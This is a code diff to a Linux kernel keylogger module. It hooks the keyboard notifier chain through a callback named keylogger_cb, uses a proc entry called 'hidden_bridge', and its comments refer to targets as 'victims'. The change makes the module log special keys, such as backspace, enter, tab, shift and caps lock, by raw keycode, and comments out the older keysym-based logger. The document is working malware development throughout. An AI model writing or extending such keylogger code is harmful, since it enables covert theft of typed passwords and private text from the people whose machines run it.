@@ -3,6 +3,7 @@
 #include <linux/proc_fs.h>
 #include <linux/uaccess.h>
 #include <linux/keyboard.h>
+#include <linux/input-event-codes.h>
 
 #define PROC_NAME "hidden_bridge"
 #define STATUS_BUF_SIZE 128
@@ -80,36 +81,79 @@ static void log_unicode_char(unsigned int ch)
     }
 }
 
-static void log_keysym(unsigned int sym)
+// Handle special/action keys based on KEY_* keycodes (pre kernel translation)
+static void log_special_key(unsigned int keycode)
 {
-    // Backspace on both victims
-    if (sym == 0xF008) 
+    switch (keycode)
     {
-        append_token("[BS]");
-        return;
-    }
+        case KEY_BACKSPACE:
+            append_token("[BS]");
+            break;
 
-    // Enter on both victims
-    if (sym == 0xF201) 
-    {
-        append_char('\n');
-        return;
-    }
+        case KEY_ENTER:
+            append_char('\n');
+            break;
 
-    // Optional: Delete (different codes on different victims)
-    if (sym == 0xF07F || sym == 0xF702) 
-    {
-        append_token("[DEL]");
-        return;
-    }
+        case KEY_DELETE:
+            append_token("[DEL]");
+            break;
 
-    char c = (char)sym;
+        case KEY_TAB:
+            append_token("[TAB]");
+            break;
 
-    if (c >= 0x20 && c <= 0x7E) 
-    {
-        append_char(c);
+        case KEY_ESC:
+            append_token("[ESC]");
+            break;
+
+        case KEY_LEFTSHIFT:
+        case KEY_RIGHTSHIFT:
+            append_token("[SHIFT]");
+            break;
+
+        case KEY_CAPSLOCK:
+            append_token("[CAPS]");
+            break;
+
+        default:
+            break;
     }
 }
+
+// static void log_keysym(unsigned int sym)
+// {
+//     // Backspace on both victims
+//     if (sym == 0xF008) 
+//     {
+//         append_token("[BS]");
+//         return;
+//     }
+
+
+//     // Enter on both victims
+//     if (sym == 0xF201) 
+//     {
+//         append_char('\n');
+//         return;
+//     }
+
+
+//     //  Delete (different codes on different victims)
+//     if (sym == 0xF07F || sym == 0xF702) 
+//     {
+//         append_token("[DEL]");
+//         return;
+//     }
+
+
+//     char c = (char)sym;
+
+
+//     if (c >= 0x20 && c <= 0x7E) 
+//     {
+//         append_char(c);
+//     }
+// }
 
 static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
 {
@@ -120,14 +164,20 @@ static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void 
         return NOTIFY_OK;
     }
 
+    // KBD_UNICODE for text, KBD_KEYCODE for special keys
     if (code == KBD_UNICODE) 
     {
         log_unicode_char(param->value); // text
     } 
-    else if (code == KBD_KEYSYM) 
+    else if (code == KBD_KEYCODE)
     {
-        log_keysym(param->value); // actions
+        log_special_key(param->value); // actions
     }
+    // else if (code == KBD_KEYSYM)
+    // {
+    //     log_keysym(param->value); // actions with keysyms
+    // }
+
 
     return NOTIFY_OK; 
 }
